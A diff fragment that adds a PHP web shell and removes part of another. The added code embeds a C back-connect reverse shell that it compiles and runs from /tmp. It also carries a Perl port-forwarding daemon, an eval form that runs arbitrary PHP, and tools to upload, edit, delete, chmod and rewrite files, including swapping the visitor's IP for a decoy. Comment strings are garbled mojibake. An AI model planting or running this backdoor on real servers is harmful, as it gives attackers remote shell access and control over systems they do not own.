+        fprintf(stderr, \" %s <ip> \", argv[0]);
+        exit(0); }
+
+addr.sin_family = AF_INET;
+addr.sin_port = htons(port);
+addr.sin_addr.s_addr = inet_addr(argv[1]);
+fd = socket(AF_INET, SOCK_STREAM, 0);
+connect(fd, (struct sockaddr*)&addr, sizeof(addr));
+
+send(fd, mesg, sizeof(mesg), 0);
+
+dup2(fd, 0);
+dup2(fd, 1);
+dup2(fd, 2);
+execl(shell, \"in.telnetd\", 0);
+
+close(fd);
+return 1;
+}
+
+";
+
+if(is_writable("/tmp")){
+if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc_c.c");}
+if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc");}
+$fp=fopen("/tmp/nst_c_bc_c.c","w");
+$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
+fwrite($fp,"$bc_c_scp");
+passthru("gcc /tmp/nst_c_bc_c.c -o /tmp/nst_bc_c");
+passthru("nohup /tmp/nst_bc_c $ip &");
+unlink("/tmp/nst_bc_c");
+unlink("/tmp/nst_bc_c.c");
+}else{
+if(is_writable(".")){
+mkdir(".nst_bc_c_tmp");
+$fp=fopen(".nst_bc_c_tmp/nst_c_bc_c.c","w");
+$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
+fwrite($fp,"$bc_c_scp");
+passthru("gcc .nst_bc_c_tmp/nst_c_bc_c.c -o .nst_bc_c_tmp/nst_bc_c");
+passthru("nohup .nst_bc_c_tmp/nst_bc_c $ip &");
+unlink(".nst_bc_c_tmp/nst_bc_c.c");
+unlink(".nst_bc_c_tmp/nst_bc_c");
+rmdir(".nst_bc_c_tmp");
+}
+}
+$show_ps="1";
+
+}#end of back connect C
+
+
+if($_POST['datapipe_pl']){
+$port_2=$_POST['port_2'];
+$port_3=$_POST['port_3'];
+$ip=$_POST['ip'];
+$datapipe_pl = "
+#!/usr/bin/perl
+# coded by CuTTer (rus hacker)
+use IO::Socket;
+use POSIX;
+
+\$localport=$port_2;
+\$host=\"$ip\";
+\$port=$port_3;
+
+\$daemon=1;
+
+\$DIR = undef;
+
+## 蔓忸滂螯 腩?耦猁蜩?(1-溧, 0-礤?
+\$log=0;
+
+
+
+
+\$| = 1;
+
+if (\$daemon){
+        print \"3anycKaeM daemon\n\";
+
+        \$pid = fork;
+        exit if \$pid;
+        die \"Couldn't fork: \$!\" unless defined(\$pid);
+        POSIX::setsid() or die \"Can't start a new session: \$!\";
+}
+
+%o = ('port' => \$localport,
+          'toport' => \$port,
+          'tohost' => \$host);
+
+\$ah = IO::Socket::INET->new(
+                         'LocalPort' => \$localport,
+                         'Reuse' => 1,
+                         'Listen' => 10)
+    || die \"湾朦? 铗牮?耦赍?潆 耦邃桧屙栝: \$!\";
+
+print \"袜麒磬屐 恹镱腠屙? 鲨觌?\n\" if \$log;
+\$SIG{'CHLD'} = 'IGNORE';
+\$num = 0;
+while (1) {
+        \$ch = \$ah->accept();
+        if (!\$ch) {
+                print STDERR \"橡屦忄眍 恹镱脲龛?accept: \$!\n\";
+                next;
+        }
+
+        printf(\"皖恹?觌桢眚: host %s, port %s.\n\",
+        \$ch->peerhost(), \$ch->peerport()) if \$log;
+        ++\$num;
+        \$pid = fork();
+        if (!defined(\$pid)) {
+                print STDERR \"湾忸珈铈眍 恹镱腠栩?fork: \$!\n\";
+    } elsif (\$pid == 0) {
+## 皖恹?镳铞羼?
+                \$ah->close();
+                Run(\%o, \$ch, \$num);
+        } else {
+                print \"Parent: Fork 镳铠咫 篑镥? 玎牮噱?耦赍?\n\" if \$log;
+                \$ch->close();
+        }
+}
+
+
+sub Run {
+        my(\$o, \$ch, \$num) = @_;
+        my \$th = IO::Socket::INET->new('PeerAddr' => \$o->{'tohost'},
+                                                        'PeerPort' => \$o->{'toport'});
+        print(\"Child: 腻豚屐 疱滂疱牝 磬 \$o->{'tohost'}, 镱痱 \$o->{'toport'}.\n\") if \$log;
+        if (!\$th) {
+                printf STDERR (\"Child: 橡屦忄?疱滂疱牝 磬 %s, 镱痱 %s.\n\",
+                \$o->{'tohost'}, \$o->{'toport'});
+                exit 0;
+        }
+
+        my \$fh;
+        if (\$o->{'dir'}) {
+                \$fh = Symbol::gensym();
+                open(\$fh, \">\$o->{'dir'}/tunnel\$num.log\")
+                or die \"Child: 橡屦忄眍 耦玟囗桢 腩?羿殡?\$o->{'dir'}/tunnel\$num.log: \$!\";
+        }
+
+        \$ch->autoflush();
+        \$th->autoflush();
+        while (\$ch || \$th) {
+                print \"Child: 玛膻鬣屐 鲨觌.\n\" if \$log;
+                my \$rin = \"\";
+                vec(\$rin, fileno(\$ch), 1) = 1 if \$ch;
+                vec(\$rin, fileno(\$th), 1) = 1 if \$th;
+                my(\$rout, \$eout);
+                select(\$rout = \$rin, undef, \$eout = \$rin, 120);
+                if (!\$rout  &&  !\$eout) {
+                        print STDERR \"Child: 硒栳赅 Timeout.\n\";
+                }
+                my \$cbuffer = \"\";
+                my \$tbuffer = \"\";
+
+                if (\$ch && (vec(\$eout, fileno(\$ch), 1) || vec(\$rout, fileno(\$ch), 1))) {
+                        print \"Child: 其屐 溧眄 铗 觌桢眚?\n\" if \$log;
+                        my \$result = sysread(\$ch, \$tbuffer, 1024);
+                        if (!defined(\$result)) {
+                                print STDERR \"Child: 硒栳赅 镳?聍栩囗梃 溧眄 觌桢眚? \$!\n\";
+                                exit 0;
+                        }
+                        if (\$result == 0) {
+                                print \"Child: 孰桢眚 铗耦邃桧桦?.\n\" if \$log;
+                                exit 0;
+                        }
+
+                        print \"Child: 泥眄: \$cbuffer\n\" if \$log;
+                }
+
+                if (\$th  &&  (vec(\$eout, fileno(\$th), 1)  || vec(\$rout, fileno(\$th), 1))) {
+                        print \"Child: 其屐 溧眄.\n\" if \$log;
+                        my \$result = sysread(\$th, \$cbuffer, 1024);
+                        if (!defined(\$result)) {
+                                print STDERR \"Child: 湾忸珈铈眍 聍栩囹?溧眄: \$!\n\";
+                                exit 0;
+                        }
+
+                        if (\$result == 0) {
+                                print \"Child: 橡铊珙?铗耦邃桧屙桢.\n\" if \$log;
+                                exit 0;
+                        }
+
+                        print \"Child: 泥眄: \$cbuffer\n\" if \$log;
+            }
+
+                if (\$fh  &&  \$tbuffer) {
+                        (print \$fh \$tbuffer);
+                }
+
+                while (my \$len = length(\$tbuffer)) {
+                        print \"Child: 悟镳噔?屐 \$len 徉轵.\n\" if \$log;
+                        my \$res = syswrite(\$th, \$tbuffer, \$len);
+                        print \"Child: 泥眄 铗镳噔脲睇.\n\" if \$log;
+                        if (\$res > 0) {
+                                \$tbuffer = substr(\$tbuffer, \$res);
+                        } else {
+                                print STDERR \"Child: 湾忸珈铈眍 铗镳噔栩?溧眄: \$!\n\";
+                        }
+                }
+
+                while (my \$len = length(\$cbuffer)) {
+                        print \"Child: 悟镳噔?屐 \$len 徉轵 觌桢眚?\n\" if \$log;
+                        my \$res = syswrite(\$ch, \$cbuffer, \$len);
+                        print \"Child: 泥眄 铗镳噔脲睇..\n\" if \$log;
+                        if (\$res > 0) {
+                                \$cbuffer = substr(\$cbuffer, \$res);
+                        } else {
+                                print STDERR \"Child: 湾忸珈铈眍 铗镳噔栩?溧眄: \$!\n\";
+                        }
+                }
+        }
+}
+
+";
+
+if(is_writable("/tmp")){
+$fp=fopen("/tmp/nst_perl_datapipe.pl","w");
+fwrite($fp,"$datapipe_pl");
+passthru("nohup perl /tmp/nst_perl_datapipe.pl &");
+unlink("/tmp/nst_perl_datapipe.pl");
+}else{
+if(is_writable(".")){
+mkdir(".nst_datapipe_tmp");
+$fp=fopen(".nst_datapipe_tmp/nst_perl_datapipe.pl","w");
+fwrite($fp,"$datapipe_pl");
+passthru("nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &");
+unlink(".nst_datapipe_tmp/nst_perl_datapipe.pl");
+rmdir(".nst_datapipe_tmp");
+}
+}
+$show_ps="1";
+
+}#end of datapipe perl
+
+
+
+
+
+if($show_ps=="1"){
+print "<center><b>[ps ux]</b></center><br><br>";
+print "<pre>";
+passthru("ps ux");
+print "</pre><br><br>";
+}
+
+
+
+echo "<form method=post><b>md5:</b><br><input name=md5 size=30>
+<Br>
+md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]
+</form>
+";
+@$md5=@$_POST['md5'];
+if(@$_POST['md5']){ echo "md5:<br><textarea rows=1 cols=113>".md5($md5)."</textarea>";}
+echo "<br>
+<form method=post><b>base64 e/d:</b><br><input name=base64 size=30></form><br>";
+if(@$_POST['base64']){
+@$base64=$_POST['base64'];
+echo "
+<b>Encode: <br><textarea rows=15 cols=113>".base64_encode($base64)."</textarea><br>
+Decode:</b> <br><textarea rows=15 cols=113>".base64_decode($base64)."</textarea><br>";}
+echo "<br>
+<form method=post><b>DES:</b><br><input name=des size=30><br>
+John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>";
+if(@$_POST['des']){
+@$des=@$_POST['des'];
+echo "<b>Des:</b> <br><textarea rows=15 cols=113>".crypt($des)."</textarea>";}
+
+print "
+<b>eval:</b<br>
+(example: print \"Hello World\";)
+<form method=post>
+<font color=red><b>&lt;?</b><br>
+<textarea name=eval rows=15 cols=113></textarea><br>
+<b>?&gt;</b></font><br>
+<input type=submit value=Run style='width:150px;'>
+</form><br>
+";
+
+function eval_sl($editf){
+if(get_magic_quotes_gpc()==1){
+$editf=stripslashes($editf);
+}
+return $editf;
+}
+
+
+if($_POST['eval']){
+print "<b>RESULT:<br><br></b>";
+eval(eval_sl($_POST['eval']));
+print "<br><br>";
+
+print "<font color=green><b>PHP:</b><br>\r\n\r\n";
+print "&lt;?\r\n";
+print "<br>";
+print htmlspecialchars(eval_sl(($_POST['eval'])));
+print "<br>";
+print "?&gt;\r\n\r\n</font><br><br>";
+
+}
+
+echo $copyr;
+exit;}
+
+if(@$_GET['replace']=="1"){
+$ip=@$_SERVER['REMOTE_ADDR'];
+$d=$_GET['d'];
+$e=$_GET['e'];
+@$de=$d."/".$e;
+$de=str_replace("//","/",$de);
+$e=@$e;
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
+echo "
+Replace tool:<br>
+(You can replace any text)<br>
+File: $de<br>
+<form method=post>
+1. Your ip.<br>
+2. microsoft.com ip :)<br>
+Replace this <input name=thisX size=30 value=$ip> by this <input name=bythis size=30 value=207.46.245.156>
+<input type=submit name=doit value=Replace>
+</form>
+";
+
+if(@$_POST['doit']){
+@$thisX=$_POST['thisX'];
+@$bythis=$_POST['bythis'];
+@$e=$_GET['e'];
+$filename="$d/$e";
+$fd = @fopen ($filename, "r");
+$rpl = @fread ($fd, @filesize ($filename));
+$re=str_replace("$thisX","$bythis",$rpl);
+$x=@fopen("$d/$e","w");
+@fwrite($x,"$re");
+echo "<br><center>$thisX Replaced by $bythis<br>
+[<a href='$php_self?d=$d&e=$e'>VIew file</a>]<br><br><Br>";
+
+}
+echo $copyr;
+exit;}
+
+
+if(@$_GET['t']=="upload"){
+echo "<br>
+<a href='$php_self?d=$d&t=massupload'>* Mass upload *</a><br>
+File upload:<br>
+<form enctype=\"multipart/form-data\" method=post>
+<input type=file name=text size=50><br>
+<input name=where size=52 value='$d'><br>
+New file name:<br>
+<input name=newf size=30 autocomplete=off> (if empty, it will be default)<br>
+<input type=submit value=Upload name=uploadf>
+</form><br>
+";
+
+if(@$_POST['uploadf']){
+$where=$_POST['where'];
+$newf=$_POST['newf'];
+$where=str_replace("//","/",$where);
+if($newf==""){$newf=$_FILES['text']['name'];}else{$newf=$newf;}
+$uploadfile = "$where/".$newf;
+if (@move_uploaded_file(@$_FILES['text']['tmp_name'], $uploadfile)) {
+$uploadfile=str_replace("//","/",$uploadfile);
+echo "<i><br>Uploaded to $uploadfile</i><br>";
+}else{
+echo "<i><br>Error</i><br>";}
+}
+}
+
+if(@$_GET['t']=="massupload"){
+echo "
+Mass upload:<br>
+<form enctype=\"multipart/form-data\" method=post>
+<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
+<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
+<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
+<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
+<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
+<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
+<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
+<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
+<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
+<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
+<input name=where size=43 value='$d'><br>
+<input type=submit value=Upload name=massupload>
+</form><br>";
+
+if(@$_POST['massupload']){
+$where=@$_POST['where'];
+$uploadfile1 = "$where/".@$_FILES['text1']['name'];
+$uploadfile2 = "$where/".@$_FILES['text2']['name'];
+$uploadfile3 = "$where/".@$_FILES['text3']['name'];
+$uploadfile4 = "$where/".@$_FILES['text4']['name'];
+$uploadfile5 = "$where/".@$_FILES['text5']['name'];
+$uploadfile6 = "$where/".@$_FILES['text6']['name'];
+$uploadfile7 = "$where/".@$_FILES['text7']['name'];
+$uploadfile8 = "$where/".@$_FILES['text8']['name'];
+$uploadfile9 = "$where/".@$_FILES['text9']['name'];
+$uploadfile10 = "$where/".@$_FILES['text10']['name'];
+$uploadfile11 = "$where/".@$_FILES['text11']['name'];
+$uploadfile12 = "$where/".@$_FILES['text12']['name'];
+$uploadfile13 = "$where/".@$_FILES['text13']['name'];
+$uploadfile14 = "$where/".@$_FILES['text14']['name'];
+$uploadfile15 = "$where/".@$_FILES['text15']['name'];
+$uploadfile16 = "$where/".@$_FILES['text16']['name'];
+$uploadfile17 = "$where/".@$_FILES['text17']['name'];
+$uploadfile18 = "$where/".@$_FILES['text18']['name'];
+$uploadfile19 = "$where/".@$_FILES['text19']['name'];
+$uploadfile20 = "$where/".@$_FILES['text20']['name'];
+if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile1</i><br>";}
+if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile2</i><br>";}
+if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile3</i><br>";}
+if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile4</i><br>";}
+if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile5</i><br>";}
+if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile6</i><br>";}
+if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile7</i><br>";}
+if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile8</i><br>";}
+if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile9</i><br>";}
+if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile10</i><br>";}
+if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile11</i><br>";}
+if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile12</i><br>";}
+if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile13</i><br>";}
+if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile14</i><br>";}
+if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile15</i><br>";}
+if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile16</i><br>";}
+if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile17</i><br>";}
+if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile18</i><br>";}
+if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile19</i><br>";}
+if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
+$where=str_replace("\\\\","\\",$where);
+echo "<i>Uploaded to $uploadfile20</i><br>";}
+}
+echo $copyr;
+exit;}
+
+if(@$_GET['yes']=="yes"){
+$d=@$_GET['d']; $e=@$_GET['e'];
+unlink($d."/".$e);
+$delresult="Success $d/$e deleted <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\">";
+}
+if(@$_GET['clean']=="1"){
+@$e=$_GET['e'];
+$x=fopen("$d/$e","w");
+fwrite($x,"");
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\">";
+exit;
+}
+
+
+if(@$_GET['e']){
+$d=@$_GET['d'];
+$e=@$_GET['e'];
+$pinf=pathinfo($e);
+if(in_array(".".@$pinf['extension'],$images)){
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\">";
+exit;}
+$filename="$d/$e";
+$fd = @fopen ($filename, "r");
+$c = @fread ($fd, @filesize ($filename));
+$c=htmlspecialchars($c);
+$de=$d."/".$e;
+$de=str_replace("//","/",$de);
+if(is_file($de)){
+if(!is_writable($de)){echo "<font color=red>READ ONLY</font><br>";}}
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
+echo "
+File contents:<br>
+$de
+<br>
+<table width=100% border=1 cellpadding=0 cellspacing=0>
+<tr><td><pre>
+$c
+
+</pre></td></tr>
+</table>
+
+";
+
+if(@$_GET['delete']=="1"){
+$delete=$_GET['delete'];
+echo "
+DELETE: Are you sure?<br>
+<a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\">Yes</a> || <a href='$php_self?no=1'>No</a>
+<br>
+";
+if(@$_GET['yes']=="yes"){
+@$d=$_GET['d']; @$e=$_GET['e'];
+echo $delresult;
+}
+if(@$_GET['no']){
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\">
+";
+}
+
+
+} #end of delete
+echo $copyr;
+exit;
+} #end of e
+
+if(@$_GET['edit']=="1"){
+@$d=$_GET['d'];
+@$ef=$_GET['ef'];
+$e=$ef;
+if(is_file($d."/".$ef)){
+if(!is_writable($d."/".$ef)){echo "<font color=red>READ ONLY</font><br>";}}
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
+$filename="$d/$ef";
+$fd = @fopen ($filename, "r");
+$c = @fread ($fd, @filesize ($filename));
+$c=htmlspecialchars($c);
+$de=$d."/".$ef;
+$de=str_replace("//","/",$de);
+echo "
+Edit:<br>
+$de<br>";
+
+if(!@$_POST['save']){
+print "
+<form method=post>
+<input name=filename value='$d/$ef'>
+<textarea cols=143 rows=30 name=editf>$c</textarea>
+<br>
+<input type=submit name=save value='Save changes'></form><br>
+";
+}
+if(@$_POST['save']){
+$editf=@$_POST['editf'];
+
+if(get_magic_quotes_runtime() or get_magic_quotes_gpc()){
+$editf=stripslashes($editf);
+}
+
+$f=fopen($filename,"w+");
+fwrite($f,"$editf");
+echo "<br>
+<b>File edited.</b>
+<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\">";
+exit;
+}
+echo $copyr;
+exit;
+}
+
+
+
+echo"
+<table width=100% cellpadding=1 cellspacing=0 class=hack>
+<tr><td bgcolor=#519A00><center><b>Filename</b></td><td bgcolor=#519A00><center><b>Tools</b></td><td bgcolor=#519A00><b>Size</b></td><td bgcolor=#519A00><center><b>Owner/Group</b></td><td bgcolor=#519A00><b>Perms</b></td></tr>
+";
+$dirs=array();
+$files=array();
+$dh = @opendir($d) or die("<table width=100%><tr><td><center>Permission Denied or Folder/Disk does not exist</center><br>$copyr</td></tr></table>");
+while (!(($file = readdir($dh)) === false)) {
+if ($file=="." || $file=="..") continue;
+if (@is_dir("$d/$file")) {
+      $dirs[]=$file;
+}else{
+      $files[]=$file;
+      }
+   sort($dirs);
+   sort($files);
+
+$fz=@filesize("$d/$file");
+}
+
+function perm($perms){
+if (($perms & 0xC000) == 0xC000) {
+   $info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+   $info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+   $info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+   $info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+   $info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+   $info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+   $info = 'p';
+} else {
+   $info = 'u';
+}
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+           (($perms & 0x0800) ? 's' : 'x' ) :
+           (($perms & 0x0800) ? 'S' : '-'));
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+           (($perms & 0x0400) ? 's' : 'x' ) :
+           (($perms & 0x0400) ? 'S' : '-'));
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+           (($perms & 0x0200) ? 't' : 'x' ) :
+           (($perms & 0x0200) ? 'T' : '-'));
+return $info;
+}
+
+
+for($i=0; $i<count($dirs); $i++){
+
+$perms = @fileperms($d."/".$dirs[$i]);
+$owner = @fileowner($d."/".$dirs[$i]);
+if($os=="unix"){
+$fileownera=posix_getpwuid($owner);
+$owner=$fileownera['name'];
+}
+$group = @filegroup($d."/".$dirs[$i]);
+if($os=="unix"){
+$groupinfo = posix_getgrgid($group);
+$group=$groupinfo['name'];
+}
+$info=perm($perms);
+if($i%2){$color="#D7FFA8";}else{$color="#D1D1D1";}
+$linkd="<a href='$php_self?d=$d/$dirs[$i]'>$dirs[$i]</a>";
+$linkd=str_replace("//","/",$linkd);
+echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color><center><font color=blue>DIR</font></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
+}
+
+for($i=0; $i<count($files); $i++){
+
+$size=@filesize($d."/".$files[$i]);
+$perms = @fileperms($d."/".$files[$i]);
+$owner = @fileowner($d."/".$files[$i]);
+if($os=="unix"){
+$fileownera=posix_getpwuid($owner);
+$owner=$fileownera['name'];
+}
+$group = @filegroup($d."/".$files[$i]);
+if($os=="unix"){
+$groupinfo = posix_getgrgid($group);
+$group=$groupinfo['name'];
+}
+$info=perm($perms);
+if($i%2){$color="#D1D1D1";}else{$color="#D7FFA8";}
+
+if ($size < 1024){$siz=$size.' b';
+}else{
+if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
+if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
+if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
+}}}
+echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?d=$d&e=$files[$i]'>$files[$i]</a></td><td bgcolor=$color><center><a href=\"javascript:ShowOrHide('$i','')\">[options]</a><div id='$i' style='display:none;z-index:1;' ><a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'><b>Edit</b></a><br><a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'><b>Delete</b></a><br><a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'><b>CHMOD</b></a><br><a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'><b>Rename</b></a><br><a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'><b>Download</b></a><br><a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'><b>Copy</b></a></div></td><td bgcolor=$color>$siz</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
+}
+
+echo "</table></td></tr></table>";
+echo $copyr;
+
 ?>
-<style type="text/css">
-input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
-</style>
-<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
-<form method="POST" action="">
-  <tr> 
-    <td height="75" align="center">
-<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
-<input type="hidden" name="do" value="login">
-<input type="submit" value="Login">
-	</td>
-  </tr>
-  </form>
-  <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url=<? echo $_SERVER['HTTP_HOST'];?>'></SCRIPT>
-  </table>
-
-<?php
-		exit;
-	}//end loginpage()
-
-	// 页面调试信息
-	function debuginfo() {
-		global $starttime;
-		$mtime = explode(' ', microtime());
-		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
-		echo "Processed in $totaltime second(s)";
-	}
-
-	// 去掉转义字符
-	function stripslashes_array(&$array) {
-		while(list($key,$var) = each($array)) {
-			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
-				if (is_string($var)) {
-					$array[$key] = stripslashes($var);
-				}
-				if (is_array($var))  {
-					$array[$key] = stripslashes_array($var);
-				}
-			}
-		}
-		return $array;
-	}
-
-	// 删除目录
-	function deltree($deldir) {
-		$mydir=@dir($deldir);	
-		while($file=$mydir->read())	{ 		
-			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
-				@chmod("$deldir/$file",0777);
-				deltree("$deldir/$file"); 
-			}
-			if (is_file("$deldir/$file")) {
-				@chmod("$deldir/$file",0777);
-				@unlink("$deldir/$file");
-			}
-		} 
-		$mydir->close(); 
-		@chmod("$deldir",0777);
-		return (@rmdir($deldir)) ? 1 : 0;
-	} 
-
-	// 判断读写情况
-	function dir_writeable($dir) {
-		if (!is_dir($dir)) {
-			@mkdir($dir, 0777);
-		}
-		if(is_dir($dir)) {
-			if ($fp = @fopen("$dir/test.txt", 'w')) {
-				@fclose($fp);
-				@unlink("$dir/test.txt");
-				$writeable = 1;
-			} else {
-				$writeable = 0;
-			}
-		}
-		return $writeable;
-	}
-
-	// 表格行间的背景色替换
-	function getrowbg() {
-		global $bgcounter;
-		if ($bgcounter++%2==0) {
-			return "firstalt";
-		} else {
-			return "secondalt";
-		}
-	}
-
-	// 获取当前的文件系统路径
-	function getPath($mainpath, $relativepath) {
-		global $dir;
-		$mainpath_info           = explode('/', $mainpath);
-		$relativepath_info       = explode('/', $relativepath);
-		$relativepath_info_count = count($relativepath_info);
-		for ($i=0; $i<$relativepath_info_count; $i++) {
